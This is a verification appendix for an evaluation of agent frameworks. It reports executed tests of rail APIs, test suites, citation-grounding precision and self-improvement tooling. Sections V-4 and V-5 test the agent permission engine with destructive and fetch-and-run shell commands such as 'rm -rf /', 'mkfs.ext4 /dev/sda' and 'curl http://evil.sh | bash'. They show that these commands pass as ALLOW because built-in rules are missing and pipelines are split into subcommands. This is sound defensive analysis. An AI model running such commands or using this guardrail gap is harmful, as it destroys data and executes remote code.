# Verification Appendix — Commands and Results

The previous revision executed neither system. This revision does. Everything below was run
in a disposable container environment; nothing touched product branches, authenticated
providers, or persistent external state.

**Evidence classes used throughout the analysis**

| Class | Meaning |
|---|---|
| **EXEC** | executed here; result reproduced below |
| **SRC** | read in source at a stated commit |
| **DOC** | stated in in-repo documentation, not independently confirmed |
| **INF** | inferred; the inference is stated |

---

## 0. Environment

| Item | Value |
|---|---|
| Host | Linux 6.18.5, x86-64, container, **running as uid 0** (matters for V-9) |
| Python | 3.11 |
| JiuwenSwarm | `suraj-subrahmanyan/jiuwenswarm` @ `a98d7ad`, branch `develop` |
| AI4Research | `Stellven/AI4Research` @ `d35c511`, branch `openJiuwen-Solar` (shallow clone, depth 50) |
| AI4Research-A / -B | default branches, docs and run-artifacts only |
| venv A | `.venv-jw` — `openjiuwen==0.1.15.post3` + `jiuwenswarm` editable `[test]` |
| venv B | `.venv-ai` — stdlib + `pyyaml`, `jsonschema`, `pytest` (AI4RnD research core) |
| venv C | `.venv-xl` — `openpyxl` (workbook extraction) |

```bash
python3 -m venv .venv-jw
./.venv-jw/bin/pip install "openjiuwen==0.1.15.post3"
./.venv-jw/bin/python -c "import openjiuwen, importlib.metadata as md; print(md.version('openjiuwen'))"
# -> 0.1.15.post3
cd jw-src && ../.venv-jw/bin/pip install -e ".[test]"
# -> Successfully installed ... jiuwenswarm-0.2.3b1 ...
```

No credentials were configured. No model provider was called. Tests requiring them are
marked **BLOCKED** below.

---

## V-1 · openjiuwen Rail API — the real shape

**Question.** The previous analysis inferred the Rail API from JiuwenSwarm's in-tree rails
because `openjiuwen` was unavailable. Is the inference correct?

```bash
./.venv-jw/bin/python exp1_rail_ability.py
```

**Result — CONFIRMED, with detail the previous analysis did not have:**

```
AgentRail.priority default : 50
has init/uninit            : True True
init signature             : (self, agent)
DeepAgentRail MRO          : ['DeepAgentRail', 'AgentRail', 'ABC', 'object']
events                     : 11 ['before_invoke', 'after_invoke', 'before_task_iteration',
                                'after_task_iteration', 'after_react_iteration',
                                'before_model_call', 'after_model_call', 'on_model_exception',
                                'before_tool_call', 'after_tool_call', 'on_tool_exception']
```

Corrections to the previous revision:
- There are **11** lifecycle events, not 10 — `after_react_iteration` was missing from the
  documentation table in `docs/en/Harness.md`.
- `AgentRail` is at `openjiuwen/core/single_agent/rail/base.py:456`; `init`/`uninit` at
  481/484; `priority: int = 50` at 479.
- `DeepAgentRail` (`openjiuwen/harness/rails/base.py:28`) adds only the two task-iteration
  hooks and `set_workspace` / `set_sys_operation`.
- `get_callbacks()` filters to *overridden* methods only, via `_is_base_method`.

---

## V-2 · Can an out-of-tree Rail register AND invoke an ability? ⭐

**Question.** This is the assumption the entire recommended architecture rested on
(previously "A4 — if wrong, Option D collapses").

**Result — PASS.** Full transcript:

```
== B. Define an out-of-tree research tool + rail ==
  LocalFunction built        : LocalFunction
  card.name                  : research_evidence
  card.input_params          : {'type':'object','properties':{'claim_id':{'type':'string'}},
                                'required':['claim_id']}
  card.stateless             : False

== C. Register onto a bare AbilityManager ==
  add_ability result         : AddAbilityResult(name='research_evidence', added=True,
                                                reason='added_tool')
  ability listed             : ['research_evidence']

== D. Invoke the registered tool through the resource manager ==
  resolved tool              : LocalFunction
  INVOKE RESULT              : evidence_for::C014     <-- real execution

== F. uninit ==
  removed abilities          : ok
  remaining abilities        : []

EXPERIMENT 1: PASS
```

**Findings.**
- `add_ability(card, tool)` is at `ability_manager.py:343`; `remove_ability` at 379.
- Correct construction is `LocalFunction(card=ToolCard(...), func=fn)` — `card` is a
  **required positional argument**, contrary to what the in-tree call sites suggest at a
  glance.
- Stateful tools (`card.stateless=False`, the default) get an agent-qualified id
  `f"{name}_{owner_id}"` and are registered with `refresh=True`; stateless tools keep a bare
  id and are `skip_if_exists`. **An integration Rail must decide this deliberately** — a
  research toolkit holding a service client should be stateful.

**Consequence.** The out-of-tree Rail seam is real and load-bearing. It is confirmed as an
integration mechanism for tools and lifecycle hooks.

---

## V-3 · Permission engine — severity mapping ⭐

```bash
./.venv-jw/bin/python exp2b_permissions.py
```

**Result — the documented mapping is exactly correct:**

| mode | LOW | MEDIUM | HIGH | CRITICAL |
|---|---|---|---|---|
| `normal` | ALLOW | ALLOW | ASK | ASK |
| `strict` | ALLOW | ASK | ASK | **DENY** |

Also confirmed:
- `tools.<name>: deny` → `PermissionLevel.DENY`, rule `tools.bash` — returns immediately.
- An explicit `action: allow` on a `CRITICAL` rule yields ALLOW even in `strict` mode —
  explicit action overrides severity, as documented.
- Correct call shape is `evaluate_tiered_policy(permissions_section, tool_name, tool_args)`
  — the **inner** `permissions` mapping, not the whole config.

---

## V-4 · Permission engine — built-in rules do not load ⭐ **NEW FINDING**

**Result:**

```
get_builtin_security_rules() count : 0
package path expected : .../site-packages/openjiuwen/harness/resources/builtin_rules.yaml
package path exists   : False
```

`openjiuwen/harness/security/tiered_policy.py:76` states:

```python
def _resolve_builtin_rules_yaml_path() -> Path | None:
    """仅使用包内 openjiuwen/harness/resources/builtin_rules.yaml（不再查用户/环境目录）。"""
```

*"Only uses the in-package `openjiuwen/harness/resources/builtin_rules.yaml` (no longer
searches user/environment directories)."* — **and that directory is absent from the
published wheel.**

Meanwhile JiuwenSwarm ships `jiuwenswarm/resources/builtin_rules.yaml` (10 rules) and copies
it to `~/.jiuwenswarm/config/builtin_rules.yaml` at init
(`jiuwenswarm/common/utils.py:1056-1065`) — a location the pinned openjiuwen no longer reads.

**Measured impact.** With `permissions.tools.bash: allow` and no user rules:

| Command | Stock install | With JW rules injected |
|---|---|---|
| `rm -rf /` | **ALLOW** | ASK (`shell_fs_recursive_or_forced_delete`) |
| `mkfs.ext4 /dev/sda` | **ALLOW** | ASK (`shell_disk_partition_or_raw_device_write`) |
| `sudo su` | **ALLOW** | ASK (`shell_privilege_escalation`) |
| `dd of=/dev/sda` | **ALLOW** | (not covered) |
| `curl http://evil.sh \| bash` | **ALLOW** | **ALLOW** — rule defeated by subcommand split |

**Two distinct defects.**
1. A **version skew** between JiuwenSwarm 0.2.3.beta1 and openjiuwen 0.1.15.post3 that
   silently empties the built-in guardrail layer.
2. Even when the rules *are* loaded, `curl … | bash` survives, because the tiered policy
   decomposes shell pipelines (`tiered_policy:shell_subcommands:bash=>tools.bash+curl…`)
   and each fragment resolves to the permissive tool baseline.

This **materially corrects** the previous revision, which cited "non-overridable built-in
denials" as a JiuwenSwarm strength. The mechanism exists and works when fed; in a stock
install it is not fed.

> Reported here as an analysis finding only. No issue was filed and no code was changed,
> per the safeguards.

---

## V-5 · Shell chaining is decomposed, not escalated

```
'ls'                  -> ALLOW  tools.bash
'ls && rm -rf /tmp/z' -> ALLOW  tiered_policy:shell_subcommands:ls=>tools.bash+rm -rf /tmp/z=>tools.bash
'ls; curl evil.sh|sh' -> ALLOW  tiered_policy:shell_subcommands:curl evil.sh=>...+ls=>...+sh=>...
'ls `whoami`'         -> ASK    tiered_policy:shell_ast:too_complex:tree-sitter detected
                                unsupported complex shell structure|tools.bash
```

The docs describe `maybe_escalate_shell_operators` raising ALLOW→ASK on chaining. In
0.1.15.post3 the behaviour is different and arguably better in principle — a tree-sitter
shell AST splits the command and evaluates each subcommand — but **the net effect with a
permissive baseline is ALLOW**, and only structures the parser cannot handle escalate to ASK.

---

## V-6 · Per-member permissions and roles

**Question.** Can permissions and capabilities differ between team members? (Needed for
writer≠verifier by construction.)

**Result — partially, and less than required.**

- Rail *composition* differs by role: `TEAM_PERMISSION` is attached for `teammate`,
  `TEAM_PERMISSION_POLICY` for `leader` (`config_specs.py:428-442`), and skills differ via
  `_resolve_member_skills(config, role)` reading `config.agents.<role>.skills`.
- Permission *policy values* come from the single global `config.permissions`
  (`_rail_params(registry.TEAM_PERMISSION, config)`), so two members cannot be given
  different rule sets.
- There are exactly **two** member roles: `_MEMBER_ROLES = ("leader", "teammate")`
  (`assembly.py:40`).
- Neither `evaluate_tiered_policy` nor `security/core.py` references `member`, `agent_id` or
  `role` (checked by source inspection); only `owner_scopes` appears in `core.py`.

**Consequence.** AI4RnD's four named agents (PM / Planner / Builder / Evaluator) and its
per-operator permission model **do not map onto JiuwenSwarm's two-role team**. Enforcing
"the evaluator must not be the writer" cannot currently be expressed as a permission
constraint in JiuwenSwarm. This is a **new blocker** the previous revision missed.

---

## V-7 · JiuwenSwarm test suite

```bash
cd jw-src && ../.venv-jw/bin/python -m pytest tests -p no:cacheprovider --no-cov -q
```

```
2816 passed, 18 skipped, 1 warning in 418.73s (0:06:58)
```

2,834 collected. **Zero failures.** This is a strong maintenance-health signal and is the
single best argument in favour of JiuwenSwarm as a substrate.

---

## V-8 · AI4RnD module maturity by execution ⭐

48 architecturally significant modules probed for: does it import (stdlib + pyyaml only), is
it referenced by the live runtime (`coordinator.sh`, `solar-harness.sh`, `graph_scheduler`,
`graph_node_dispatcher`, `multi_task_runner`), and is it referenced by tests.

```
import OK 48/48 | wired 29/48 | tested 43/48
```

**Everything imports.** The 19 unwired modules are the finding:

| Implemented, tested, **not wired** | LOC |
|---|---|
| `capability_capsules` | 1351 |
| `capsule_execution_gate` | 194 |
| `skill_to_capsule_compiler` | 323 |
| `capability_token` | 105 |
| `logical_operator_registry` | 33 |
| `physical_operator_catalog` | 100 |
| `operator_router` | 305 |
| `operator_state_machine` | 233 |
| `task_graph_io` | 351 |
| `task_graph_state_io` | 491 |
| `evidence_ledger` | 117 |
| `event_ledger` | 198 |
| `actor_registry` / `actor_lease` / `actor_mailbox` / `actor_runtime` | 382 / 238 / 102 / 329 |
| `context_store`, `solar_db` | 58 / 41 |

The `actor_*` family is a durable actor model with registry, leases and mailboxes — directly
relevant to Harness Core features 2 and 4 — sitting unused.

---

## V-9 · AI4RnD test suites

Full-suite collection aborts: `tests/test_youtube_influence_digest_quality.py` imports a
script that calls `raise SystemExit(2)` at module level, producing a pytest
`INTERNALERROR`. Targeted subsets were run instead.

| Suite | Result |
|---|---|
| `tests/graph` | **321 passed** (67s) |
| `tests/evaluators` | **104 passed** (220s) |
| `tests/gate_ledger` | **124 passed, 2 failed** |
| `tests/experience` | **7 passed** |
| `tests/evolution`, `tests/control_plane` | no Python tests (shell-based) |

**The 2 failures are environment artifacts, not defects.** Both assert that a write fails in
a directory made read-only with `os.chmod(target, 0o500)`; the container runs as uid 0, and
root bypasses permission bits:

```
os.chmod(target, 0o500)
>  assert rec is None
E  AssertionError: assert {'record_id': ..., 'kind': 'gate_check', ...} is None
```

**Total observed: 556 passed, 2 environment-failed.** The scheduler, evaluator and
gate-ledger cores are genuinely exercised.

---

## V-10 · AI4RnD research core runs standalone ⭐

No Solar runtime, no `HARNESS_DIR`, stdlib + pyyaml only:

```bash
python lib/research/cli.py init "$DB" --topic "Transformer efficiency" --depth-tier standard
python lib/research/cli.py add-source "$DB" --run-id "$RID" --title FlashAttention --text "..."
python lib/research/cli.py extract "$DB" --run-id "$RID" --source-id "$SID"
python lib/research/cli.py ledger  "$DB" --run-id "$RID"
python lib/research/cli.py mine    "$DB" --run-id "$RID"
```

```
Initialized research DB  · 7 tables: research_runs, research_sources, evidence_items,
                            claims, claim_evidence, report_sections, section_checks
Source added: 6697dbc0...  Content hash: ec607d44cee4f586...
Evidence extracted: ev_6c000678c02551b2   Span: [0, 150)
Evidence items: 1
Claim mining ... Claims: 3   Claim-evidence links: 3
```

**Confirms the port is cheap.** Deterministic ids, SHA-256 content hashing and character
spans all work outside the harness. Resolves prior spike E3.

---

## V-11 · Capability capsules execute and validate ⭐

```bash
HARNESS_DIR=$(pwd) PYTHONPATH=lib python -c "import capability_capsules as cc; ..."
```

```
registry entries: 30
manifests VALID: 23   INVALID: 0

contract              : ['inputs','outputs','preconditions','postconditions','invariants']
composition           : ['consumes','produces','compatible_with','incompatible_with','requires_after']
effects               : ['read','write','execute','network','cost']
bindings              : ['skills','mcp_capabilities','data_refs','secret_refs','required_guard_capsules']
verification          : ['self_check','external_verifier','pass_conditions']
operator_compatibility: ['preferred','forbidden']
provenance            : ['owner','created_at','manifest_path']
```

**This settles the "capsules are not renamed skills" question by execution.** Note
`bindings.skills` — a skill is an *ingredient* of a capsule.

Also confirmed: `capsule_execution_gate` exposes `check_cooldown`, `check_idempotency`,
`GateDecision`, `IdempotencyResult` — real pre-dispatch gating, unwired.

---

## V-12 · Citation grounding quality — MEASURED ⭐ **decisive**

**Question.** Prior spike E8: is `_jaccard`-based grounding good enough to support the claim
that AI4RnD output is verified?

**Mechanism found.** Grounding does not use Jaccard at all. `evaluator.py:443-476`:

```python
overlap = sorted(context_tokens & evidence_tokens)
checks.append({..., "ok": bool(overlap), ...})
```

A citation is "grounded" if the citing line shares **one** token (≥3 chars, per
`TOKEN_RE = [A-Za-z0-9_\-]{3,}|[一-鿿]{2,}`) with the evidence text. `_jaccard` is
used elsewhere, for source diversity.

**Measurement.** One evidence item; nine citing sentences hand-labelled for actual support:

| Verdict | Truth | Overlap tokens that carried it |
|---|---|---|
| GROUNDED | ✅ true | achieves, and, flashattention, gpt-2, io-aware, speedup, training |
| GROUNDED | ✅ true | and, between, flashattention, gpu, hbm, memory, reads, reduces |
| GROUNDED | ❌ **false** | `flashattention` — "…is an approximation that trades accuracy for speed" |
| GROUNDED | ❌ **false** | achieves, flashattention, speedup — "…100x speedup on GPT-4" |
| GROUNDED | ❌ **false** | method, the — "…substantially slower than standard attention" |
| GROUNDED | ❌ **false** | `flashattention` — "…was invented in 1823 by Napoleon Bonaparte" |
| GROUNDED | ❌ **false** | `and` — "**Bananas are yellow and grow in tropical climates**" |
| GROUNDED | ❌ **false** | and, memory, method, the, training |
| FLAGGED | ❌ false | `[]` — "Nothing whatsoever relates here xyzzy plugh frobnicate" |

```
PRECISION of 'grounded'      = 0.25   (6 of 8 passes are wrong)
DETECTION of unsupported     = 1/7 = 0.14
```

**Only a sentence sharing literally zero tokens is flagged.** A fabricated claim survives on
a single content word; an unrelated sentence survives on the stopword "and".

**Corroborating search.** No entailment machinery exists anywhere in AI4RnD — a
word-boundary search for `entail`, `NLI`, `entailment`, `cross_encoder`, `CrossEncoder`,
`deberta`, `mnli` across `harness/lib/**/*.py` returns **zero** matches.

**Consequence.** AI4RnD's Evidence/Factuality evaluator (feature 70) does not currently
verify grounding in any meaningful sense. The ledger, spans and hashing are sound — the
*judgement* on top of them is not. This is the most important single correction in this
revision, and it moves real entailment from "Stage 5 hardening" to **Stage 1 blocking work**.

---

## V-13 · RSI — GEPA is real and unwired ⭐

```bash
HARNESS_DIR=$(pwd) PYTHONPATH=.:lib python -m integrations.gepa_optimizer.cli --help
HARNESS_DIR=$(pwd) PYTHONPATH=lib python lib/evolution_engine.py scorecard --json
```

`integrations/gepa_optimizer/` — **3,540 LOC**, 11 modules, with the complete controlled-
improvement lifecycle:

```
propose  Analyse target and print an optimisation proposal (no mutations).
run      Run the GEPA optimiser (dry-run by default; use --execute for real run).
review   Show candidates and Pareto front from a completed run.
promote  Promote a candidate to the target path (must be under /tmp).
rollback Roll back the last promotion at the given target path.
status   Show status of a run directory or list recent runs.
```

Its safety contract is genuinely strong:
- dry-run default; `--execute` **rejected unless all three** of `--max-evals`, `--max-spend`,
  `--max-walltime` are supplied;
- promotion target must be under `/tmp`; production paths rejected;
- `hard_policy_checker.py` freezes core safety policy — candidates may not relax
  `secrets_access`, `git_push`, `destructive_shell`, `payment_action`,
  `external_api_write`.

`evolution_engine.py` also executes (`scorecard` / `recommend` / `promote` / `demote-degraded`
/ `status`) but tracks exactly **one** capability (`deepresearch.quality_gate`) with 0
terminal nodes and 0 examples.

**Neither is referenced by `coordinator.sh` or `solar-harness.sh`.**

**RSI coverage across the eight target classes** (word-boundary search):

| RSI target | Named methods | Present? |
|---|---|---|
| 1 Text artifacts | GEPA / MIPROv2 / TextGrad | **GEPA yes (19 files)**; MIPROv2 0; TextGrad 0 |
| 2 Runtime routing | Bayesian opt / bandits | **0** |
| 3 Capsules & operators | trajectory mining / CEGIS / Voyager | partial (`skill_to_capsule_compiler`); CEGIS 0, Voyager 0 |
| 4 DAG & organisation | AFlow / MCTS / ADAS | **0** |
| 5 Evaluator & governance | judge calibration / reward modelling | **0** |
| 6 Memory & evidence | Self-RAG / reranker training | **0** |
| 7 Model weights | SFT / LoRA / DPO / GRPO | **0** (matches are persona markdown + a report appendix) |
| 8 Data & benchmarks | active learning / hard-case mining | partial (`failure_miner`, 109 LOC) |

**One of eight surfaces is implemented, and it is not connected.**

---

## V-14 · openJiuwen-DeepSearch overlap — prior risk R5 resolved ⭐

Prior revision flagged this as possibly invalidating the whole integration case.

```
scripts/main.py            337 LOC
grep -c "citation|evidence|claim|provenance" scripts/main.py  ->  0
```

The skill is a thin wrapper (`run_jiuwen_workflow`, `execute_deep_search`,
`run_background`) around an openjiuwen workflow, producing Markdown/Doc/HTML after ~15
minutes. It has **no** evidence ledger, claim model, citation span, source authority scoring,
or gate.

**Conclusion: not a competitor to the intended AI4RnD product.** They are different classes
of artifact — a generated report versus an audited evidence bundle. Prior risk R5 is
**downgraded from High to Low**. (The converse also holds: DeepSearch is not a starting
point for feature 70 either.)

---

## Blocked tests

| Test | Why |
|---|---|
| Live model routing / provider selection | requires provider credentials — safeguard: no paid or authenticated providers |
| End-to-end JiuwenSwarm chat with a real agent | requires a model endpoint |
| jiuwenbox sandbox enforcement (bwrap/cgroup) | requires kernel privileges unavailable in this container |
| RailManager hot-reload against a **live** `DeepAgent` | requires a running agent server with a model backend; V-2 verified the mechanism against a real `AbilityManager` instead |
| Rail survival across agent-cache invalidation and restart | same dependency; **remains open** — see [10](10-risks-assumptions-open-questions.md) Q17 |
| GEPA `run --execute` | would spend model budget; only `--help` and `status` were run |
| AI4RnD tmux dispatch path | requires tmux + agent CLIs + credentials |
| Full AI4RnD suite | collection aborts (`SystemExit` at import); subsets run instead |

---

## Summary of corrections to the previous revision

| # | Previous claim | Corrected finding | Class |
|---|---|---|---|
| 1 | Rail seam "Medium-High confidence, not executed" | **Verified by execution** — register + invoke + uninit all work | EXEC |
| 2 | 10 rail lifecycle events | **11** — `after_react_iteration` was undocumented | EXEC |
| 3 | Permission engine has "non-overridable built-in denials" as a strength | **Built-in rules load 0 in a stock install**; `rm -rf /` returns ALLOW | EXEC |
| 4 | Shell chaining escalates ALLOW→ASK | Chaining is **decomposed**; net effect ALLOW | EXEC |
| 5 | Per-member permissions assumed feasible | **Only two roles; policy is global** — writer≠verifier not expressible | SRC |
| 6 | Capsules ≈ skills, dismissed | **Formal 11-section contract**; 30 registered, 23 validated | EXEC |
| 7 | RSI "largely aspirational" | **GEPA is 3,540 LOC with a full promote/rollback lifecycle**, unwired | EXEC |
| 8 | Grounding "precision unknown, spike E8" | **Precision 0.25 / detection 0.14**, measured | EXEC |
| 9 | DeepSearch might invalidate the case (risk R5, High) | **Zero evidence machinery** — risk downgraded to Low | EXEC |
| 10 | AI4RnD maturity judged by reading | **48/48 import, 29/48 wired** — 19 implemented-but-unwired modules found | EXEC |
| 11 | JiuwenSwarm health unknown | **2,816 tests pass, 0 fail** | EXEC |
| 12 | AI4RnD test health unknown | **556 pass, 2 root-environment artifacts** | EXEC |
